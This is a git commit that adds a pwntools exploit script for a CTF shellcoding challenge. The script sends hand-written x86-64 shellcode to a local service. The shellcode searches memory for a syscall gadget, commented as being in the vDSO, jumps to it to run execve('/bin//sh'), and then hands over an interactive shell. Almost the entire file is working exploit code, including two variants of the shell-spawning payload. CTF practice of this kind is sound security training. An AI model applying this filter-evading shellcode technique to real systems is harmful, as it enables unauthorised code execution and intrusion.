5313f604e929a43e488103840dc36a262f218aa1
Ollrogge <nils-ollrogge@outlook.de>
2025-07-22 20:46:47 +0000

    add cornctf25 he protecc

---
+++ shellcoding/corn2025_he_protecc/exp.py
@@ -0,0 +1,135 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host 127.0.0.1 --port 4000
+
+# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
+# dont forget to set conext.arch. E.g amd64
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='amd64')
+exe = './protected'
+context.terminal = ["tmux", "splitw", "-hb"]
+argv = []
+env = {}
+e = ELF(exe)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or '127.0.0.1'
+port = int(args.PORT or 4000)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+# pwndbg tele command
+gdbscript = '''
+break *0x4033ca
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start(argv, env=env)
+
+sc = '''
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+'''
+
+sc = '''
+    xor rbx, rbx
+    /* find syscall gadget in vdso */
+search:
+    add rbx, 2
+    mov rax, rsp
+    mov rax, [rax+0x170]
+
+    mov cx, word ptr [rax+rbx]
+    cmp cx, 0x050f
+    jne search
+    add rax, rbx
+    mov r8, rax
+
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+
+    jmp r8
+'''
+
+sc = asm(sc)
+
+# 0x7fff25b2e000
+# 0x7ffea6304000
+
+#sc = asm(shellcraft.sh())
+
+
+io.sendlineafter("How long is your shellcode?", str(len(sc)))
+
+io.send(sc)
+
+
+io.interactive()
